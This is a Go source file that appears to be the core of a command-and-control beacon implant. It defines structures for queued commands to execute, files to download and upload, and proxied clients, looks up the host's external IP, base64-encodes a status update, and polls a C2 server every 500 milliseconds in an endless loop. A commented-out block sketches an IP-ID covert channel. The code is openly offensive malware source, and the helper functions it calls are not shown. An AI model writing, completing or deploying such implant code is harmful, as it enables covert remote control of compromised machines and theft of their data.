package main

import (
	"time"
	"net/http"
	"encoding/json"
)

type Beacon struct {
	Ip string
	Id string
	ProxyClients []Beacon
	ExecBuffer []string
	DownloadBuffer []string
	UploadBuffer []string
	LastSeen time.Time
}

var msPerUpdate int = 500
var cmdProxyIp string
var cmdProxyId string
var cmdAddress string
var cmdPort string
var cmdHost string
var id string
var ip string
var queryData string
var debug bool = false
var netClient = &http.Client{
	Timeout: time.Second * 10,
}

func queryC2Server(handler Request) {
	handler.queryServer()
}

func main() {
	lhost, err := externalIP()
	debugFatal(err)
	ip = lhost
	jsonData, err := json.Marshal(CommandUpdate{ip,id,"",nil})
	debugFatal(err)
	
	var encoder = Base64Encoder {
		data: jsonData,
	}

	jsonData, err = json.Marshal(CommandUpdate{ip,id,"cooltest123 asd asd",nil})
	debugFatal(err)

	/*var ipidEncoder = IPIDEncoder {
		data: jsonData,
	}

	var ipidUpdateRequest = BeaconIPID {
		data: ipidEncoder.scramble(),
	}

	ipidUpdateRequest.queryServer()*/

	var serverUpdateRequest = BeaconHttp {
		method: "GET",
		data: encoder.scramble(),
	}

	for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
		go func() {
			queryC2Server(serverUpdateRequest)
		}()
	}
}